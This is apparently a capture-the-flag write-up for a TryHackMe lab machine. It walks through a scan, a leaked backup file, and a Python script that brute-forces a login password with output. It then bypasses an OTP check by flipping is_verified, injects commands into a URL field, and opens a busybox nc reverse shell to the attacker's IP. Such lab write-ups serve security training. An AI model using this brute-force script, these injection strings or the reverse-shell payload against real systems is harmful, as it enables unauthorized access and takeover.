# Interceptor

[Interceptor](https://tryhackme.com/room/interceptor)

Nmap :

```markdown
└─# nmap 10.49.178.133 -p- -sC -sV
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 00:06 +0530
Nmap scan report for 10.49.178.133
Host is up (0.047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 82:96:bd:05:c9:ac:57:f5:56:40:45:0d:37:17:9c:a0 (RSA)
|   256 7a:fb:1f:80:94:0f:f9:80:ed:d3:58:e6:f6:2b:f9:6a (ECDSA)
|_  256 9f:0d:fc:a3:ec:bc:25:ce:f8:f4:13:4d:f0:e2:53:fd (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MediaHub
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.07 seconds
```

10.49.178.133 (Website) :

![image.png](image.png)

as well as login page :

![image.png](image%201.png)

we run directory scanning :

![image.png](image%202.png)

we find /login.php.bak

which contains :

```php
<?php
include "header.php";

/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: Redacted
|
| Password policy reminder:
| Admin password follows company format:
| Redacted + any year
|
| TODO: remove before production deployment
*/
?>

<div class="row justify-content-center">
  <div class="col-md-5">
    <div class="card p-4">

      <h4 class="mb-3">Login</h4>

      <form id="loginForm">
        <input class="form-control mb-3" name="email" placeholder="Email" required>

        <input class="form-control mb-3" name="password" type="password" placeholder="Password" required>

        <button id="btnLogin" class="btn btn-primary w-100" type="submit">
          Login
        </button>
      </form>

      <div id="msg" class="mt-3"></div>

    </div>
  </div>
</div>

<script>
const form = document.getElementById("loginForm");
const msg  = document.getElementById("msg");
const btn  = document.getElementById("btnLogin");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  msg.innerHTML = `<div class="text-muted">Signing in...</div>`;
  btn.disabled = true;

  const payload = new FormData(form);

  try {
    const res = await fetch("api_login.php", {
      method: "POST",
      body: payload
    });

    const data = await res.json();

    if (!data.ok) {
      msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">${data.error}</div>`;
      btn.disabled = false;
      return;
    }

    msg.innerHTML = `<div class="alert alert-success py-2 mb-0">${data.message}</div>`;
    setTimeout(() => window.location = data.redirect, 400);

  } catch (err) {
    msg.innerHTML = `<div class="alert alert-danger py-2 mb-0">Something went wrong.</div>`;
    btn.disabled = false;
  }
});
</script>

<?php include "footer.php"; ?> 
```

so we get hint for the password :

`username : Redacted`

`password : Redacted+any year`

we use this script to find which year we have to use in the password

```python
import requests

url = "http://intercept.thm/api_login.php"
email = "admin@mediahub.thm"

headers = {
    "Accept-Language": "en-GB,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Origin": "http://10.49.178.133",
    "Referer": "http://10.49.178.133/login.php",
    "Accept": "*/*",
}

for i in range(1900, 2101):

    # New session every 2 attempts
    if (i - 1900) % 2 == 0:
        session = requests.Session()
        session.headers.update(headers)

    password = f"MediaHub{i}"

    files = {
        "email": (None, email),
        "password": (None, password),
    }

    response = session.post(url, files=files)

    print(f"[*] Trying {password} | HTTP {response.status_code}")

    # Adjust this condition based on the application's response
    if "invalid" not in response.text.lower() and "incorrect" not in response.text.lower():
        print(f"\n[+] Possible password found: {password}")
        print(response.text)
        break
else:
    print("\n[-] Password not found in range.")
```

we find the password :

```markdown
┌──(root㉿AkhilBangaru)-[/home/akhilbangaru/THM/Interceptor]
└─# python3 script.py
[*] Trying Redacted1900 | HTTP 200
[*] Trying Redacted1901 | HTTP 200
[*] Trying Redacted1902 | HTTP 200
[*] Trying Redacted1903 | HTTP 200
[*] Trying Redacted1904 | HTTP 200
[*] Trying Redacted1905 | HTTP 200
[*] Trying Redacted1906 | HTTP 200
[*] Trying Redacted1907 | HTTP 200
[*] Trying Redacted1908 | HTTP 200
[*] Trying Redacted1909 | HTTP 200
[*] Trying Redacted1910 | HTTP 200
[*] Trying Redacted1911 | HTTP 200
[*] Trying Redacted1912 | HTTP 200
[*] Trying Redacted1913 | HTTP 200
[*] Trying Redacted1914 | HTTP 200
[*] Trying Redacted1915 | HTTP 200
[*] Trying Redacted1916 | HTTP 200
[*] Trying Redacted1917 | HTTP 200
[*] Trying Redacted1918 | HTTP 200
[*] Trying Redacted1919 | HTTP 200
[*] Trying Redacted1920 | HTTP 200
[*] Trying Redacted1921 | HTTP 200
[*] Trying Redacted1922 | HTTP 200
[*] Trying Redacted1923 | HTTP 200
[*] Trying Redacted1924 | HTTP 200
[*] Trying Redacted1925 | HTTP 200
[*] Trying Redacted1926 | HTTP 200
[*] Trying Redacted1927 | HTTP 200
[*] Trying Redacted1928 | HTTP 200
[*] Trying Redacted1929 | HTTP 200
[*] Trying Redacted1930 | HTTP 200
[*] Trying Redacted1931 | HTTP 200
[*] Trying Redacted1932 | HTTP 200
[*] Trying Redacted1933 | HTTP 200
[*] Trying Redacted1934 | HTTP 200
[*] Trying Redacted1935 | HTTP 200
[*] Trying Redacted1936 | HTTP 200
[*] Trying Redacted1937 | HTTP 200
[*] Trying Redacted1938 | HTTP 200
[*] Trying Redacted1939 | HTTP 200
[*] Trying Redacted1940 | HTTP 200
[*] Trying Redacted1941 | HTTP 200
[*] Trying Redacted1942 | HTTP 200
[*] Trying Redacted1943 | HTTP 200
[*] Trying Redacted1944 | HTTP 200
[*] Trying Redacted1945 | HTTP 200
[*] Trying Redacted1946 | HTTP 200
[*] Trying Redacted1947 | HTTP 200
[*] Trying Redacted1948 | HTTP 200
[*] Trying Redacted1949 | HTTP 200
[*] Trying Redacted1950 | HTTP 200
[*] Trying Redacted1951 | HTTP 200
[*] Trying Redacted1952 | HTTP 200
[*] Trying Redacted1953 | HTTP 200
[*] Trying Redacted1954 | HTTP 200
.
.
.
.
.
.
.
.
.
.
[+] Possible password found: Redacted
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

so `password : Redacted`

we try to log in :

![image.png](image%203.png)

we need to enter otp

we could try brute-forcing it but it is 6 digits otp it will take more time so we do it another way

we enter 123456 as otp and intercept the request using burp

![image.png](image%204.png)

we see that server responds with is_verified variable as false we try to send the variable as true in post data

![image.png](image%205.png)

we see that it works

we are logged in :

![image.png](image%206.png)

we also find out our first flag

we see we can enter url’s into import feed field

there is no sanitization for this field we run

```markdown
http://127.0.1$(id)
```

![image.png](image%207.png)

and the cmd executes

## Shell as www-data :

we enter 

```markdown
127.0.1&(busybox nc yourip 1234 -e sh)
```

we get shell :

![image.png](image%208.png)

we get the flag :

![image.png](image%209.png)